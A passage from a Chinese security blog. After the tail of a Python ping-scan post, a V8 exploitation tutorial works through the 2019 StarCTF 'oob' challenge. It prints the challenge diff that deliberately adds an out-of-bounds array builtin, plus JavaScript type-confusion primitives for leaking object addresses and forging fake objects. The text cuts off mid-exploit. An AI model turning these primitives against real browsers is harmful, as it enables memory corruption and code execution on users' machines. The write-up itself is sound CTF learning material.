output:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">str</span>(line).upper().find(<span class="string">&quot;TTL&quot;</span>) &gt;= <span class="number">0</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;ip: %s 在线&quot;</span> % ip_str)</span><br></pre></td></tr></table></div></figure>


        <h3 id="2-获取本IP"   >
          <a href="#2-获取本IP" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-获取本IP" class="headerlink" title="(2)获取本IP"></a>(2)获取本IP</h3>
      <figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_self_ip</span>():</span></span><br><span class="line">    <span class="keyword">global</span> netD_name</span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)</span><br><span class="line">    <span class="keyword">return</span> socket.inet_ntoa(fcntl.ioctl(s.fileno(), <span class="number">0x8915</span>, struct.pack(<span class="string">&#x27;256s&#x27;</span>, <span class="built_in">bytes</span>(netD_name[:<span class="number">15</span>],<span class="string">&#x27;utf-8&#x27;</span>)))[<span class="number">20</span>:<span class="number">24</span>])</span><br><span class="line">self_ip = get_self_ip()</span><br></pre></td></tr></table></div></figure>


        <h3 id="3-从stdout获取输出"   >
          <a href="#3-从stdout获取输出" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-从stdout获取输出" class="headerlink" title="(3)从stdout获取输出"></a>(3)从stdout获取输出</h3>
      <figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_conten_from_stdout</span>(<span class="params">self,func</span>):</span></span><br><span class="line">    sys.stdout = string_io = StringIO()</span><br><span class="line">    func()</span><br><span class="line">    sys.stdout = self._stdout</span><br><span class="line">    print_str = string_io.getvalue()</span><br><span class="line">    <span class="keyword">del</span> string_io</span><br><span class="line">    <span class="keyword">return</span> print_str</span><br><span class="line"></span><br><span class="line">print_str = self.get_conten_from_stdout(pkt.show)</span><br></pre></td></tr></table></div></figure>

</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2022/03/01/V8%E4%BB%8E0%E5%BC%80%E5%A7%8B/">V8从0开始</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2022-03-01</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2022-03-22</span></span></div></header><div class="post-body"><div class="post-excerpt">
        <h1 id="一、环境搭建"   >
          <a href="#一、环境搭建" class="heading-link"><i class="fas fa-link"></i></a><a href="#一、环境搭建" class="headerlink" title="一、环境搭建"></a>一、环境搭建</h1>
      <p>参照[<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://bbs.pediy.com/thread-268933.htm#msg_header_h1_5" >原创]v8利用初探 2019 StarCTF oob 复现分析-Pwn-看雪论坛-安全社区|安全招聘|bbs.pediy.com</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h2 id="1-代理设置"   >
          <a href="#1-代理设置" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-代理设置" class="headerlink" title="1.代理设置"></a>1.代理设置</h2>
      <figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git config --global http.proxy http://ip:port</span><br><span class="line"><span class="built_in">export</span> &#123;http,https&#125;_proxy=<span class="string">&quot;http://ip:port&quot;</span></span><br></pre></td></tr></table></div></figure>


        <h2 id="2-代码下载"   >
          <a href="#2-代码下载" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-代码下载" class="headerlink" title="2.代码下载"></a>2.代码下载</h2>
      <figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://chromium.googlesource.com/chromium/tools/depot_tools.git</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;export PATH=/pathto/depot_tools:<span class="variable">$PATH</span>&quot;</span> &gt;&gt; ~/.bashrc</span><br><span class="line"><span class="comment">#获取v8源码</span></span><br><span class="line">fetch v8</span><br><span class="line"><span class="comment">#切换题目对应版本的commit</span></span><br><span class="line">git checkout 6dc88c191f5ecc5389dc26efa3ca0907faef3598</span><br><span class="line"><span class="comment"># 工具同步</span></span><br><span class="line">gclient sync</span><br><span class="line"><span class="comment">#应用题目的补丁文件</span></span><br><span class="line"><span class="comment">#一般而言出题都是人为给某个版本的v8加一个洞上去，所以用题目给的diff文件给引擎加洞</span></span><br><span class="line">git apply ../oob.diff</span><br><span class="line"></span><br><span class="line"><span class="comment">#有的老版本最好还是用python2来编译，不然语法可能会出错</span></span><br><span class="line"><span class="comment"># 编译release版本</span></span><br><span class="line"><span class="comment">#测试exp用release版本，用debug版本测试通常会出错</span></span><br><span class="line">./tools/dev/v8gen.py x64.release</span><br><span class="line">ninja -C ./out.gn/x64.release</span><br><span class="line"></span><br><span class="line"><span class="comment"># 编译debug版本</span></span><br><span class="line"><span class="comment">#调试用debug版本</span></span><br><span class="line">./tools/dev/v8gen.py x64.debug</span><br><span class="line">ninja -C ./out.gn/x64.debug</span><br></pre></td></tr></table></div></figure>






        <h1 id="二、前置知识"   >
          <a href="#二、前置知识" class="heading-link"><i class="fas fa-link"></i></a><a href="#二、前置知识" class="headerlink" title="二、前置知识"></a>二、前置知识</h1>
      <p>参考：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/203721.html" >从一道CTF题零基础学V8漏洞利用 - FreeBuf网络安全行业门户</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h2 id="1-调试知识"   >
          <a href="#1-调试知识" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-调试知识" class="headerlink" title="1.调试知识"></a>1.调试知识</h2>
      <p>需要注意的是debug版本的用来辅助显示，直接是没办法运行相关代码的，realse用来实际运行。</p>

        <h3 id="1-工具"   >
          <a href="#1-工具" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-工具" class="headerlink" title="(1)工具"></a>(1)工具</h3>
      <p>常见的pwndbg，可以搭配如下的小工具</p>
<p>源码的<code>/pathto/v8/tools</code>目录下有专门用来调试v8的gdbinit，加在<code>~/.gdbinit</code>中即可</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">source /pathto/v8/tools/gdbinit</span><br></pre></td></tr></table></div></figure>


        <h3 id="2-函数"   >
          <a href="#2-函数" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-函数" class="headerlink" title="(2)函数"></a>(2)函数</h3>
      <p>在运行./d8时加入<code>--allow-natives-syntax</code>选项，可以使用一些调试函数</p>
<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">./d8 --allow-natives-syntax</span><br><span class="line"><span class="comment">#或者配合gdb</span></span><br><span class="line">gdb ./d8</span><br><span class="line"><span class="built_in">set</span> args --allow-natives-syntax ./test.js</span><br><span class="line">r</span><br></pre></td></tr></table></div></figure>

<p>如下函数</p>
<figure class="highlight javascript"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">%DebugPrint(obj) <span class="comment">//输出对象地址</span></span><br><span class="line">%SystemBreak() <span class="comment">//触发调试中断主要结合gdb等调试器使用，类似于python中的dbg()断点</span></span><br></pre></td></tr></table></div></figure>

<p>示例代码如下：</p>
<figure class="highlight js"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>];</span><br><span class="line"><span class="keyword">var</span> b = [<span class="number">1.1</span>, <span class="number">2.2</span>, <span class="number">3.3</span>];</span><br><span class="line"><span class="keyword">var</span> c = [a, b];</span><br><span class="line">%DebugPrint(a);</span><br><span class="line">%SystemBreak();  <span class="comment">//触发第一次调试</span></span><br><span class="line">%DebugPrint(b);</span><br><span class="line">%SystemBreak();  <span class="comment">//触发第二次调试</span></span><br><span class="line">%DebugPrint(c);</span><br><span class="line">%SystemBreak();  <span class="comment">//触发第三次调试</span></span><br></pre></td></tr></table></div></figure>




        <h2 id="2-基础知识"   >
          <a href="#2-基础知识" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-基础知识" class="headerlink" title="2.基础知识"></a>2.基础知识</h2>
      
        <h3 id="1-对象内存讲解"   >
          <a href="#1-对象内存讲解" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-对象内存讲解" class="headerlink" title="(1)对象内存讲解"></a>(1)对象内存讲解</h3>
      <figure class="highlight js"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>];</span><br></pre></td></tr></table></div></figure>

<p>比如如下定义数组对象a，那么运行<code>%DebugPrint(a);</code>得到地址后，使用job命令可以看到如下的内存布局</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203012217111.png" alt="image-20220301220834343"></p>
<p>v8在内存中只有数字和对象两种表示。为了区分两者，v8在所有对象的内存地址末尾都加了1，以便表示它是个对象。因此上图该对象的实际内存地址应该为(0x346b7364dde9-1=<strong>0x346b7364dde8</strong>)</p>
<p>而对于数组对象则大致如下布局</p>
<div class="table-container"><table>
<thead>
<tr>
<th align="center">map</th>
<th align="center">表明了一个对象的类型对象，上图即为PACKED_SMI_ELEMENTS</th>
</tr>
</thead>
<tbody><tr>
<td align="center">prototype</td>
<td align="center">prototype</td>
</tr>
<tr>
<td align="center">elements</td>
<td align="center">对象元素</td>
</tr>
<tr>
<td align="center">length</td>
<td align="center">元素个数</td>
</tr>
<tr>
<td align="center">properties</td>
<td align="center">属性</td>
</tr>
</tbody></table></div>
<p>而对于其中的elements元素也是一个对象，且地址位于对象a的上方，能看到里面的内容，也就是说先申请的elements这个元素内存，然后再申请的数组对象a</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203012221043.png" alt="image-20220301222151967"></p>
<p>那么总的内存布局如下</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">elements     ----&gt; +------------------------+</span><br><span class="line">                   |          MAP           +&lt;---------+</span><br><span class="line">                   +------------------------+          |</span><br><span class="line">                   |      element 1         |          |</span><br><span class="line">                   +------------------------+          |</span><br><span class="line">                   |      element 2         |          |</span><br><span class="line">                   |      ......            |          |</span><br><span class="line">                   |      element n         |          |</span><br><span class="line">                   +------------------------+          |</span><br><span class="line">                   |      .........         |          |</span><br><span class="line"> ArrayObject  ----&gt;-------------------------+          |</span><br><span class="line">                   |      map               |          |</span><br><span class="line">                   +------------------------+          |</span><br><span class="line">                   |      prototype         |          |</span><br><span class="line">                   +------------------------+          |</span><br><span class="line">                   |      elements          |+--------+|</span><br><span class="line">                   +------------------------+</span><br><span class="line">                   |      length            |</span><br><span class="line">                   +------------------------+</span><br><span class="line">                   |      properties        |</span><br><span class="line">                   +------------------------+</span><br></pre></td></tr></table></div></figure>

<p>其他类型的对象都有些类似，可以自己去尝试看看</p>
<p>其中也不一定元素后面就跟的是<code>ArrayObject</code>的内容，也可能中间间隔了很多东西，比如如下情形，<code>elements</code>的地址和<code>ArrayObject</code>的地址差的还是挺大的，可能是内存分配上的一些问题吧?不太懂v8的内存分配是怎么实现的。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203182051776.png" alt="image-20220318205130634"></p>

        <h3 id="2-不同对象类型内存分布"   >
          <a href="#2-不同对象类型内存分布" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-不同对象类型内存分布" class="headerlink" title="(2)不同对象类型内存分布"></a>(2)不同对象类型内存分布</h3>
      
        <h4 id="①数组对象"   >
          <a href="#①数组对象" class="heading-link"><i class="fas fa-link"></i></a><a href="#①数组对象" class="headerlink" title="①数组对象"></a>①数组对象</h4>
      <figure class="highlight js"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> array = [<span class="number">1.1</span>,<span class="number">2.2</span>,<span class="number">3.3</span>];</span><br></pre></td></tr></table></div></figure>

<p>如下内存布局</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">elements     ----&gt; +------------------------+&lt;---------+</span><br><span class="line">                   |          MAP           +		   |</span><br><span class="line">                   +------------------------+          |</span><br><span class="line">                   |      element 1         |          |</span><br><span class="line">                   +------------------------+          |</span><br><span class="line">                   |      element 2         |          |</span><br><span class="line">                   |      ......            |          |</span><br><span class="line">                   |      element n         |          |</span><br><span class="line">                   +------------------------+          |</span><br><span class="line">                   |      .........         |          |</span><br><span class="line"> ArrayObject  ----&gt;-------------------------+          |</span><br><span class="line">                   |      map               |          |</span><br><span class="line">                   +------------------------+          |</span><br><span class="line">                   |      prototype         |          |</span><br><span class="line">                   +------------------------+          |</span><br><span class="line">                   |      elements          |+--------+|</span><br><span class="line">                   +------------------------+</span><br><span class="line">                   |      length            |</span><br><span class="line">                   +------------------------+</span><br><span class="line">                   |      properties        |</span><br><span class="line">                   +------------------------+</span><br></pre></td></tr></table></div></figure>

<p>double或者float的数组也相似，就是map的类型为<code>PACKED_DOUBLE_ELEMENTS</code></p>

        <h4 id="②对象数组对象"   >
          <a href="#②对象数组对象" class="heading-link"><i class="fas fa-link"></i></a><a href="#②对象数组对象" class="headerlink" title="②对象数组对象"></a>②对象数组对象</h4>
      <figure class="highlight js"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> objectArray = [a, b];<span class="comment">//a,b为对象</span></span><br></pre></td></tr></table></div></figure>

<p>即数组里存放的是对象，也是类似的，就是在elements中会有点不一样，相当于存放一个指针指向包含的对象，包括map的类型也不同，为<code>PACKED_ELEMENTS</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203012230225.png" alt="image-20220301223028101"></p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">elementA     ----&gt; +------------------------+&lt;---------+</span><br><span class="line">                   |         MAP            +		   |</span><br><span class="line">                   +------------------------+          |</span><br><span class="line">                   |       Length           +		   |</span><br><span class="line">                   +------------------------+          |</span><br><span class="line">                   |      element 1         |          |</span><br><span class="line">                   +------------------------+          |</span><br><span class="line">                   |      element 2         |          |</span><br><span class="line">                   |      ......            |          |</span><br><span class="line">                   |      element n         |          |</span><br><span class="line">                   +------------------------+          |</span><br><span class="line">                   |      .........         |          |</span><br><span class="line">elementB     ----&gt; +------------------------+&lt;---------+</span><br><span class="line">                   |         MAP            +		   |</span><br><span class="line">                   +------------------------+          |</span><br><span class="line">                   |       Length           +		   |</span><br><span class="line">                   +------------------------+          |</span><br><span class="line">                   |      element 1         |          |</span><br><span class="line">                   +------------------------+          |</span><br><span class="line">                   |      element 2         |          |</span><br><span class="line">                   |      ......            |          |</span><br><span class="line">                   |      element n         |          |</span><br><span class="line">                   +------------------------+          |</span><br><span class="line">                   |      .........         |          |</span><br><span class="line"> ArrayObject  ----&gt;-------------------------+          |</span><br><span class="line">                   |      map               |          |</span><br><span class="line">                   +------------------------+          |</span><br><span class="line">                   |      prototype         |          |</span><br><span class="line">                   +------------------------+          |</span><br><span class="line">                   |      elements          |+--------+|</span><br><span class="line">                   +------------------------+</span><br><span class="line">                   |      length            |</span><br><span class="line">                   +------------------------+</span><br><span class="line">                   |      properties        |</span><br><span class="line">                   +------------------------+</span><br></pre></td></tr></table></div></figure>


        <h3 id="3-类型混淆"   >
          <a href="#3-类型混淆" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-类型混淆" class="headerlink" title="(3)类型混淆"></a>(3)类型混淆</h3>
      <p>即当我们能够修改<code>ArrayObject</code>的map属性时，就能够造成类型混淆。比如</p>
<figure class="highlight js"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> float_array = [<span class="number">1.1</span>,<span class="number">2.2</span>,<span class="number">3.3</span>,<span class="number">4.4</span>];<span class="comment">//创建一个浮点数数组</span></span><br><span class="line"><span class="keyword">let</span> obj = &#123;<span class="string">&quot;a&quot;</span>: <span class="number">1</span>&#125;;<span class="comment">//创建一个对象</span></span><br><span class="line"><span class="keyword">let</span> obj_array = [obj];<span class="comment">//创建一个对象数组</span></span><br><span class="line"><span class="keyword">let</span> float_array_map = float_array[<span class="number">4</span>];<span class="comment">//假设可以越界将float_array的map属性的值读出来</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//假设可以越界写obj_array的map属性，修改为浮点数数组的map属性的值</span></span><br><span class="line">obj_array[<span class="number">1</span>] = float_array_map;</span><br><span class="line"></span><br><span class="line"><span class="comment">//由于obj_array的map属性被修改为浮点数数组的map属性</span></span><br><span class="line"><span class="comment">//那么此时当js去解析的时候，就会把obj_array[0]当作一个浮点数</span></span><br><span class="line"><span class="comment">//从而能够读出obj_array[0]的地址,即obj的地址</span></span><br><span class="line"><span class="keyword">let</span> obj_addr = f2i(obj_array[<span class="number">0</span>]);<span class="comment">//f2i为浮点转无符号整数函数</span></span><br></pre></td></tr></table></div></figure>

<p>同样的，当我们能够修改把一个浮点数数组的map属性改为对象数组的map属性时，就能够使得v8认为该浮点数数组中的浮点数实际是一个对象，而我们控制数组中的变量的值为一个地址，这样就能将一个任意地址转化为一个obj对象了。</p>
<figure class="highlight js"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> float_array = [<span class="number">1.1</span>,<span class="number">2.2</span>,<span class="number">3.3</span>,<span class="number">4.4</span>];<span class="comment">//创建一个浮点数数组</span></span><br><span class="line"><span class="keyword">let</span> obj = &#123;<span class="string">&quot;a&quot;</span>: <span class="number">1</span>&#125;;<span class="comment">//创建一个对象</span></span><br><span class="line"><span class="keyword">let</span> obj_array = [obj];<span class="comment">//创建一个对象数组</span></span><br><span class="line"><span class="keyword">let</span> obj_array_map = obj_array[<span class="number">1</span>];<span class="comment">//假设可以越界将obj_array的map属性的值读出来</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//假设可以越界写float_array的map属性，修改为obj_array的map属性的值</span></span><br><span class="line">float_array[<span class="number">4</span>] = obj_array_map;</span><br><span class="line"></span><br><span class="line"><span class="comment">//由于float_array的map属性被修改为对象数组的map属性</span></span><br><span class="line"><span class="comment">//那么此时当js去解析的时候，就会把float_array[0]当作一个对象</span></span><br><span class="line"><span class="comment">//从而能够伪造任意地址为一个虚假的对象</span></span><br><span class="line">fake_obj_addr = i2f(<span class="number">0x111111</span>);<span class="comment">//i2f为整数转浮点数</span></span><br><span class="line">float_array[<span class="number">0</span>] = fake_obj_addr;</span><br><span class="line"><span class="keyword">let</span> fake_obj = float_array[<span class="number">0</span>];<span class="comment">//获取该虚假对象</span></span><br></pre></td></tr></table></div></figure>




        <h1 id="三、实际题目"   >
          <a href="#三、实际题目" class="heading-link"><i class="fas fa-link"></i></a><a href="#三、实际题目" class="headerlink" title="三、实际题目"></a>三、实际题目</h1>
      <p>参考：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://4hou.win/wordpress/?p=32405" >从一道CTF题零基础学V8漏洞利用 – backup (4hou.win)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h2 id="1-题目分析"   >
          <a href="#1-题目分析" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-题目分析" class="headerlink" title="1.题目分析"></a>1.题目分析</h2>
      <p>添加的diff如下，主要是一下两部分，其他部分加入的就只是为了正常运行而已</p>
<figure class="highlight diff"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="addition">+    SimpleInstallFunction(isolate_, proto, &quot;oob&quot;,</span></span><br><span class="line"><span class="addition">+                          Builtins::kArrayOob,2,false);</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="addition">+BUILTIN(ArrayOob)&#123;</span></span><br><span class="line"><span class="addition">+    uint32_t len = args.length();</span></span><br><span class="line"><span class="addition">+    if(len &gt; 2) return ReadOnlyRoots(isolate).undefined_value();</span></span><br><span class="line"><span class="addition">+    Handle&lt;JSReceiver&gt; receiver;</span></span><br><span class="line"><span class="addition">+    ASSIGN_RETURN_FAILURE_ON_EXCEPTION(</span></span><br><span class="line"><span class="addition">+            isolate, receiver, Object::ToObject(isolate, args.receiver()));</span></span><br><span class="line"><span class="addition">+    Handle&lt;JSArray&gt; array = Handle&lt;JSArray&gt;::cast(receiver);</span></span><br><span class="line"><span class="addition">+    FixedDoubleArray elements = FixedDoubleArray::cast(array-&gt;elements());</span></span><br><span class="line"><span class="addition">+    uint32_t length = static_cast&lt;uint32_t&gt;(array-&gt;length()-&gt;Number());</span></span><br><span class="line"><span class="addition">+    if(len == 1)&#123;</span></span><br><span class="line"><span class="addition">+        //read</span></span><br><span class="line"><span class="addition">+        return *(isolate-&gt;factory()-&gt;NewNumber(elements.get_scalar(length)));</span></span><br><span class="line"><span class="addition">+    &#125;else&#123;</span></span><br><span class="line"><span class="addition">+        //write</span></span><br><span class="line"><span class="addition">+        Handle&lt;Object&gt; value;</span></span><br><span class="line"><span class="addition">+        ASSIGN_RETURN_FAILURE_ON_EXCEPTION(</span></span><br><span class="line"><span class="addition">+                isolate, value, Object::ToNumber(isolate, args.at&lt;Object&gt;(1)));</span></span><br><span class="line"><span class="addition">+        elements.set(length,value-&gt;Number());</span></span><br><span class="line"><span class="addition">+        return ReadOnlyRoots(isolate).undefined_value();</span></span><br><span class="line"><span class="addition">+    &#125;</span></span><br><span class="line"><span class="addition">+&#125;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#以下两部分只是为了能正常运行这个添加的函数而已</span><br><span class="line"><span class="addition">+  CPP(ArrayOob)        \</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="addition">+    case Builtins::kArrayOob:</span></span><br><span class="line"><span class="addition">+      return Type::Receiver();</span></span><br><span class="line"> </span><br></pre></td></tr></table></div></figure>

<p>即添加了为数组对象<code>ArrayOob</code>添加了一个函数oob()，其功能为</p>
<ul>
<li>当参数只有一个(默认传入this指针)，返回数组最后一个元素之后的元素</li>
<li>当参数有两个(除了this指针之外再传入一个参数)，就用我们传入的参数覆盖数组最后一个元素之后的元素</li>
<li>其他情况下返回一个undefined</li>
</ul>
<p>即该函数可以实现<strong>读/写</strong>数组对象MAP属性</p>

        <h2 id="2-漏洞分析"   >
          <a href="#2-漏洞分析" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-漏洞分析" class="headerlink" title="2.漏洞分析"></a>2.漏洞分析</h2>
      <p>关键在于数组对象<code>ArrayOob</code>的内存空间，尝试看一下</p>
<figure class="highlight js"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> float_array = [<span class="number">1.1</span>,<span class="number">2.2</span>,<span class="number">3.3</span>,<span class="number">4.4</span>];</span><br><span class="line">%DebugPrint(float_array);</span><br><span class="line">%SystemBreak();</span><br></pre></td></tr></table></div></figure>

<p>调试跑起来，查看elements处的内存</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203182013498.png" alt="image-20220318201300196"></p>
<p>即在数组对象的元素之后为数组对象的结构体，之前也提到过。而对象的map如果能被修改，就能引起v8的类型混淆，之前已经提到过。</p>
<p>那么我们利用类型混淆，来构造获取任意对象的地址的函数<code>getAddress(obj)</code>以及修改任意地址为对象的函数<code>getFakeObj(addr)</code></p>

        <h3 id="1-构造转化函数"   >
          <a href="#1-构造转化函数" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-构造转化函数" class="headerlink" title="(1)构造转化函数"></a>(1)构造转化函数</h3>
      <figure class="highlight js"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> float_array = [<span class="number">1.1</span>,<span class="number">2.2</span>,<span class="number">3.3</span>,<span class="number">4.4</span>];<span class="comment">//创建一个浮点数数组</span></span><br><span class="line"><span class="keyword">let</span> obj = &#123;<span class="string">&quot;a&quot;</span>: <span class="number">1</span>&#125;;<span class="comment">//创建一个对象</span></span><br><span class="line"><span class="keyword">let</span> obj_array = [obj];<span class="comment">//创建一个对象数组</span></span><br><span 